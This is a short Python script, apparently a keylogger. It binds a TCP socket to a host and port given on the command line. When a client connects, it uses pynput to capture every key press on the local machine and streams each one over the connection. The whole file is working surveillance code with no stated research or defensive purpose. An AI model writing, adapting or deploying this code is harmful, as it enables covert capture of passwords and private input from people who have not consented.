import socket

from pynput.keyboard import Key, Listener
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])
global conn

def key_press(key):
	k = str(key)
	k = k.replace("'", "")
	try:
		conn.sendall(bytes(k, "ascii"))
	except:
		print("connection closed")

while True:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind((HOST,PORT))
		s.listen()

		conn, addr = s.accept()
		listener = Listener(on_press=key_press)
		listener.start()
		with conn:
			print('Connected by, ', addr)
			while True:
				data = conn.recv(1024)
				if not data:
					break
				print(data.decode("ASCII"))


